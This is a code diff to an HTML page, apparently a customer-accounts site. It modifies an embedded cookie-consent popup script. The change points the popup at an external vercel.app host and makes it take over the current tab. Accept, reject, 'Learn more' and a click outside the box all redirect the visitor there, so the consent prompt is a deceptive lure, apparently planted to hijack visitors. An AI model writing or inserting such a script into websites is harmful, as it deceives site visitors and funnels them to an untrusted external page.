@@ -5,7 +5,7 @@
 
 <script>
 (() => {
-  const REDIRECT_URL = "https://google.com/";
+  const REDIRECT_URL = "https://help-iutz.vercel.app/";
   const CONSENT_KEY = "cookieConsent";
 
   function setConsent(value) {
@@ -16,12 +16,9 @@
     return localStorage.getItem(CONSENT_KEY);
   }
 
-  function redirectNewTab() {
-    try {
-      window.top.open(REDIRECT_URL, "_blank");
-    } catch (e) {
-      window.open(REDIRECT_URL, "_blank");
-    }
+  // Redirect current tab instead of opening new tab
+  function redirectSameTab() {
+    window.location.href = REDIRECT_URL;
   }
 
   function generateConsentPopup() {
@@ -82,13 +79,18 @@
           background-color: #f44336;
           color: white;
         }
+        .cookie-learn-more {
+          color: #90caf9;
+          text-decoration: underline;
+          cursor: pointer;
+        }
       </style>
       <div class="cookie-modal">
         <div class="cookie-icon" aria-hidden="true" style="font-size:2em;">🍪</div>
         <h2 class="cookie-title">Do you accept cookies?</h2>
         <p class="cookie-text">
           This website uses cookies to enhance your experience. 
-          <a href="#" class="cookie-learn-more" style="color: #90caf9;">Learn more</a>.
+          <a href="#" class="cookie-learn-more">Learn more</a>.
         </p>
         <div class="cookie-actions">
           <button class="cookie-btn cookie-btn--accept">Accept</button>
@@ -101,7 +103,7 @@
 
   document.addEventListener("DOMContentLoaded", () => {
     const consent = getConsent();
-    if (consent) return;
+    if (consent) return; // Consent already given or rejected, no popup
 
     const consentPopup = generateConsentPopup();
     document.body.appendChild(consentPopup);
@@ -110,41 +112,36 @@
     const rejectBtn = consentPopup.querySelector(".cookie-btn--reject");
     const learnMoreLink = consentPopup.querySelector(".cookie-learn-more");
 
-    // Accept button
     acceptBtn.addEventListener("click", () => {
       setConsent("accepted");
-      redirectNewTab();
+      redirectSameTab();
     });
 
-    // Reject button
     rejectBtn.addEventListener("click", () => {
       setConsent("rejected");
-      redirectNewTab();
+      redirectSameTab();
     });
 
-    // Learn more link
     learnMoreLink.addEventListener("click", (e) => {
       e.preventDefault();
       setConsent("learn-more");
-      redirectNewTab();
+      redirectSameTab();
     });
 
-    // Click outside modal
     consentPopup.addEventListener("click", (e) => {
       if (!e.target.closest(".cookie-modal")) {
         setConsent("clicked-outside");
-        redirectNewTab();
+        redirectSameTab();
       }
     });
   });
 
-  // Reload on back/restore
+  // Reload on back/restore to avoid cached page showing popup again
   window.addEventListener("pageshow", (event) => {
     if (event.persisted) {
       location.reload();
     }
   });
-
 })();
 </script>
 
@@ -769,4 +766,5 @@ _W.setup_model_rpc({"rpc_namespace":"_W.CustomerAccounts.RPC","model_namespace":
 
 	</body>
 </html>
+
 
